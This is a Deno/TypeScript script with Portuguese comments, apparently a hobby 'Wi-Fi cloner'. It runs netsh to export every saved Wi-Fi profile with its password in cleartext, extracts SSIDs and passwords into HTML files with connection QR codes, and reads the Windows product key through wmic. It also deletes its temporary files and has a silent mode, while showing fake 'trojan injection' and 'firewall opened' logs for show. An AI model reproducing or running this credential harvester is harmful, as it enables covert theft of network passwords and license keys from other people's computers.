import { checkDirs, clearTags, createHTML, getNow, rand } from './Functions.ts';
import { SpinnerTypes, TerminalSpinner } from '@spinners';
import { keypress } from '@cliffy/keypress';
import { qrcode } from '@qrcode';
import { delay } from '@std';
import colors from '@colors';
import $ from '@dax';

let showLogs = !Deno.args.includes('-q');
let key: string; // Windows License Key
let c = 0; // network counter
colors;

// Função intermediária para delay();
const sleep = (timeout: number) => showLogs && delay(timeout);

//  Ativa o Listener para o teclado
silentMode();

// Verifica se todas as pastas necessárias foram criadas
await checkDirs();

// 'Title.txt' contém uma string bem cringe
const title: string = await Deno.readTextFile('data/Title.txt')
	.catch(() => '');
showLogs && console.log(title.text_bold.red);

class Spinner {
	sector: string;
	text: string;
	spinner: TerminalSpinner | undefined;

	constructor(sector: string, text: string) {
		this.sector = sector;
		this.text = text;

		// Inicia Spinner
		showLogs &&
			(this.spinner = new TerminalSpinner({
				text: this._format(),
				spinner: {
					interval: 40,
					frames: SpinnerTypes.dots.frames,
				},
				indent: 1,
				color: 'green',
			}).start());
	}

	end(msg: string) {
		this.text = msg;
		this.spinner?.succeed(this._format(1));
	}

	fail(msg: string) {
		this.text = msg;
		this.spinner?.fail(this._format(1));
	}

	_format(status = 0) {
		return [ // Modelo de string
			'[',
			this.sector.toUpperCase().green, // [ SECTOR
			'|',
			getNow('T').yellow, // [ SECTOR | 18:04
			'] -',
			status ? this.text.red : this.text.cyan,
		].join(' ').text_bold; // [ SETOR | 18:04 ] - TEXT
	}
}

// "injetar trojan" vulgo acessar uma API nativa do Windows
await NetSHProfileCollector();

// Copiar key do Windows
await copyWinKey();

// Limpar registros de arquivos
await Deno.remove('temp', { recursive: true }).catch(() => {});
// 'recursive' significa que é pra apagar mesmo se tiver arquivos dentro

!showLogs && Deno.exit();

async function NetSHProfileCollector() {
	// sem await pra exibir os logs enquanto copia os dados
	createFakeLogs();

	// Chama a API do Windows
	await $`netsh wlan export profile key=clear folder=temp`.lines();

	for await (const file of Deno.readDir('temp')) {
		// Por padrão, A API fornece as informações em arquivos XML bem poluídos
		// Então eu fiz essa bosta aqui pra deixar só o que é realmente importante
		c++;

		// Lendo o conteúdo do arquivo
		const content = await Deno.readTextFile(`temp/${file.name}`);

		// Filtrando as tags que são úteis
		const [SSID, , auth, pswd] = clearTags(content.matchAll(
			/<(name|authentication|keyMaterial)>.*?<\/.*>/g,
		));

		// Gerando QR Code para conectar
		const networkQR = await qrcode(
			`WIFI:S:${SSID};T:${auth};P:${pswd};H:false;;`,
			{ size: 256 },
		);

		// Escrevendo arquivos com as informações filtradas no diretório final
		const body = `
		SSID: <s${SSID[0]}s>
		Data: <s${getNow()}s> (<timestamp>${getNow(true)}</timestamp>)
		Autenticação: ${auth[1]}
		Senha: <s${pswd[1]}s><br>
	<img src="${networkQR}">`;

		await Deno.writeTextFile(
			`data/WiFiPasswords/${SSID[0]}.html`,
			createHTML(SSID[0], body),
		);
	}
}

async function copyWinKey() {
	key =
		(await $`wmic path softwarelicensingservice get OA3xOriginalProductKey`
			.lines())[1].trim();

	const body = `
	Máquina: <s${Deno.hostname()}s>
	Data: <s${getNow()}s> (<timestamp>${getNow(true)}</timestamp>)
	Chave de ativação do Windows: <s<key>${key}</key>s>`;

	await Deno.writeTextFile(
		`data/WindowsKeys/${Deno.hostname()}.html`,
		createHTML(Deno.hostname(), body),
	);
}

async function createFakeLogs() {
	let spinner;
	const fakeLogs = [
		['Injetando Trojan na API do NetSH...', 'Script injetado.'],
		['Modificando permissões do Windows...', 'Permissões concedidas.'],
		[
			'Abrindo porta no FireWall...',
			'FireWall desbloqueado na porta 8080.',
		],
	];

	// Exibe status fakes pra impressionar leigos
	for (const msg of fakeLogs) {
		spinner = new Spinner('Wi-Fi CLONER', msg[0]);
		await sleep(rand());
		spinner.end(msg[1]);
	}

	spinner = new Spinner('Wi-Fi CLONER', 'Clonando redes Wi-Fi...');
	await sleep(rand(1_000, 3_000));
	spinner.end(`${c} redes clonadas.`.text_underscore.bg_red.white);

	spinner = new Spinner('KEY CLONER', 'Obtendo chave de ativação...');
	await sleep(rand());
	spinner.end(`Chave de ativação: ${key.text_underscore.bg_red.white}`);

	spinner = new Spinner('CLEANER', 'Apagando registros...');
	await sleep(rand());
	spinner.end('Registros excluídos.');
	await sleep(rand(1_500, 3_000));

	showLogs && Deno.exit();
}

async function silentMode() {
	for await (const event of keypress()) {
		if (event.key === 'escape') Deno.exit();

		// quando a tecla S for pressionada
		if (event.key === 's') showLogs = false;
		// ativa o silent mode
	}
}
